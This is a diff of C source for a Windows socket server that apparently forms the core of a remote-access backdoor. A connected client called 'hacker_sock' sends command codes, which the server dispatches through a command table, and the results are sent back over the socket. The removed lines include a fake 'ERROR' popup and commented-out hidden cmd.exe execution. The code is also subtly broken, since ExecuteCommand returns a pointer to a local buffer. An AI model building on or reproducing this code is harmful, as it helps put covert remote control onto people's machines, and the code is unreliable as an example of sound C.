@@ -1,8 +1,9 @@
 #include <tchar.h> // _tprintf
-#include <conio.h> // clrscr
+#include <stdio.h> // sscanf
 
 #include "Server.h"
 #include "Tools.h"
+#include "Commands.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -78,47 +79,57 @@ VOID RunServer(SOCKET listen_sock)
 		_tprintf(TEXT("Connected\n"));
 		while (TRUE)
 		{
-			int bytes = recv(hacker_sock, cmd, CMD_LENGTH, 0);
+			INT bytes = recv(hacker_sock, cmd, CMD_LENGTH, 0);
 			recv(hacker_sock, args, ARGS_LENGTH, 0);
 
 			if (!bytes || bytes == SOCKET_ERROR)
 				break;
 
-			_tprintf(TEXT("cmd:'%hs', args:'%hs'\n"), cmd, args);
-			switch (cmd[0])
+			INT code = UNDEFINEDCMD;
+			sscanf_s(cmd, "%d", &code);
+			if (code == UNDEFINEDCMD)
 			{
-			case MESSAGE: {
-				TCHAR buffer[ARGS_LENGTH] = { 0 };
-				_stprintf_s(buffer, ARGS_LENGTH, TEXT("%hs"), args);
-				MessageBoxEx(NULL, buffer, TEXT("ERROR"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));
+				_tprintf(TEXT("Undefined cmd code(%hs)\n"), cmd);
+
+				send(hacker_sock, TASK_FAILUREA, (int)strlen(TASK_FAILUREA), 0);
+
 				break;
 			}
 
-			case EXECUTE: {
-				//TCHAR buf[ARGS_LENGTH + 3] = TEXT(" /c"); // +3 for '/c'
-				//strcat_s(buf, ARGS_LENGTH + 3, args);
-				// SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
-				// shell.fMask = SEE_MASK_NOCLOSEPROCESS;
-				// shell.lpFile = "cmd.exe";
-				// shell.lpParameters = "ipconfig > a.txt";
-				// shell.nShow = SW_HIDE;
-				// ShellExecuteEx(&shell);
-				// WaitForSingleObject(shell.hProcess, INFINITE);
-				//ShellExecuteEx(NULL, TEXT("open"), TEXT("cmd.exe"), TEXT("ipconfig > a.out"), NULL, SW_HIDE);
-				break; 
-			}
+			TCHAR targs[ARGS_LENGTH] = { 0 };
+			_stprintf_s(targs, ARGS_LENGTH, TEXT("%hs"), args);
 
-			default:
-				break;
-			}	
+			CONST PTCHAR tresult = ExecuteCommand(code, targs);
+			
 
-			// send(hacker_sock, success, strlen(success), 0);
+			char result[RESULT_LENGTH] = { 0 };
+			size_t retval = 0;
+			wcstombs_s(&retval, result, RESULT_LENGTH, tresult, RESULT_LENGTH - 1);
+
+			_tprintf(TEXT("Sending answer(%hs)\n"), result);
+			send(hacker_sock, result, RESULT_LENGTH, 0);
 		}
-
+		
 		closesocket(hacker_sock);
 
 		_tprintf(TEXT("Client disconnected\n"));
-		SleepEx(5000, FALSE);
+		SleepEx(10000, FALSE);
 		ClearConsole();
 	}
+}
+
+CONST PTCHAR ExecuteCommand(INT code, const PTCHAR args)
+{
+	_tprintf(TEXT("cmd:'%d', args:'%ws'\n"), code, args);
+
+	TCHAR result[RESULT_LENGTH] = { 0 };
+	for (size_t i = 0; i < NUMBER_OF_COMMANDS; ++i)
+		if (MAP_COMMANDS[i].pair.code == code)
+		{
+			MAP_COMMANDS[i].task(args, result);
+			
+			return result;
+		}
+
+	return UNDEFINEDP;
 }
